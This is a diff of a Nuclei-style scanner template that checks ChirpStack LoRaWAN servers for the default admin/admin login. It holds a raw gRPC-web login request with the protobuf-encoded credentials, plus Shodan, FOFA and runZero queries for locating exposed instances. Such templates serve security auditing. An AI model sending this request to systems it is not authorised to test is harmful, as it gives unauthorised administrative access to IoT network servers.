@@ -1,5 +1,4 @@
 id: chirpstack-default-login
-
 info:
   name: ChirpStack - Default Login
   author: t3l3machus
@@ -13,14 +12,21 @@ info:
     cvss-score: 8.3
     cwe-id: CWE-1392
   metadata:
-    verified: true
+    runzero-match: any(each(service["html.titles"]), {# matches "ChirpStack LoRaWAN"})
+    fofa-query: title="ChirpStack LoRaWAN"
     max-request: 1
     shodan-query: http.title:"ChirpStack LoRaWAN"
-    fofa-query: title="ChirpStack LoRaWAN"
-  tags: default-login,chirpstack
-
+    verified: true
+  tags: chirpstack,default-login,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - contains(content_type, 'application/grpc-web-text+proto')
+          - status_code==200
+          - contains(body, 'AAAAA')
+        type: dsl
+    raw:
       - |
         POST /api.InternalService/Login HTTP/1.1
         Host: {{Hostname}}
@@ -28,14 +34,3 @@ http:
         Accept: application/grpc-web-text
 
         AAAAAA4KBWFkbWluEgVhZG1pbg==
-
-      # AAAAAA4KBWFkbWluEgVhZG1pbg== is proto buffer encoded string for admin admin
-
-    matchers:
-      - type: dsl
-        dsl:
-          - "contains(content_type, 'application/grpc-web-text+proto')"
-          - "status_code==200"
-          - "contains(body, 'AAAAA')"
-        condition: and
-# digest: 4b0a00483046022100cb3560bf0f467f37155922829f58fb8882ae97a5205fa41aa31aef0e5595d63c022100844dfc2e322d4563684284492d05f63b4611086be1785663b97b977580760e37:922c64590222798bb761d5b6d8e72950
